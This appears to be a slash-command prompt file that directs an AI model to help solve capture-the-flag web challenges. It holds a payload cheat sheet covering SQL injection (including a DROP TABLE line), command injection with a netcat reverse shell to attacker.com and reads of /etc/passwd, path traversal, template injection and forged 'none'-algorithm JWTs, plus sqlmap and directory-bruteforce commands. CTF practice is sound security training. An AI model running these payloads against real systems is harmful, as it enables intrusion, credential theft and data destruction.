# /ctf.web - Web Challenge Assistance

Help solve web security challenges.

## When to Use

Use this command when:

- Challenge provides a URL or web application
- Challenge involves SQL injection, XSS, or other web vulns
- Need to analyze web source code
- Challenge mentions APIs, cookies, or sessions

## Initial Reconnaissance

1. **Check common paths**

   ```text
   /robots.txt
   /sitemap.xml
   /.git/
   /admin
   /api
   /backup
   ```

2. **View source**
   - HTML comments
   - JavaScript files
   - Hidden form fields

3. **Check cookies/headers**
   - Session tokens
   - Security headers
   - Server information

## Common Vulnerabilities

### SQL Injection

```bash
# Test for SQLi
' OR '1'='1
' OR 1=1--
" OR ""="
'; DROP TABLE users;--

# Union-based
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

# Blind SQLi
' AND 1=1--  (true)
' AND 1=2--  (false)
```

### Command Injection

```bash
; ls -la
| cat /etc/passwd
`whoami`
$(cat flag.txt)
; nc attacker.com 4444 -e /bin/sh
```

### Path Traversal

```text
../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Server-Side Template Injection (SSTI)

```text
# Jinja2
{{7*7}}
{{config}}
{{request.application.__globals__}}

# Twig
{{7*7}}
{{_self.env.display('id')}}
```

### JWT Vulnerabilities

```python
# None algorithm
import jwt
token = jwt.encode({"admin": True}, key=None, algorithm="none")

# Weak secret
# Try common passwords or brute force
```

## Key Tools

```bash
# Check available tools
ctf check --category web

# SQL injection
sqlmap -u "http://target/page?id=1" --dbs

# Directory bruteforce
gobuster dir -u http://target -w wordlist.txt
ffuf -u http://target/FUZZ -w wordlist.txt

# Fuzzing
ffuf -u http://target/api/FUZZ -w params.txt -mc 200

# Web vuln scanner
nikto -h http://target
```

## sqlmap Quick Reference

```bash
# Basic test
sqlmap -u "http://target/?id=1"

# List databases
sqlmap -u "http://target/?id=1" --dbs

# List tables
sqlmap -u "http://target/?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test"

# With cookies
sqlmap -u "http://target/?id=1" --cookie="session=abc123"
```

## Python Requests Template

```python
import requests

url = "http://target/endpoint"
session = requests.Session()

# GET request
r = session.get(url, params={"id": "1"})

# POST request
r = session.post(url, data={"user": "admin", "pass": "test"})

# JSON
r = session.post(url, json={"user": "admin"})

# Custom headers
r = session.get(url, headers={"X-Custom": "value"})

# With cookies
r = session.get(url, cookies={"session": "token"})

print(r.text)
print(r.cookies)
```

## Response Format

When responding to /ctf.web:

1. **Application Analysis**: What the app does, tech stack
2. **Vulnerability Found**: Type and location of vuln
3. **Exploitation**: How to exploit it
4. **Payload/Request**: The actual exploit request
5. **Flag**: Result from exploitation

## Related Commands

- `/ctf.analyze` - For analyzing provided source code
- `/ctf.crypto` - For JWT/encryption issues
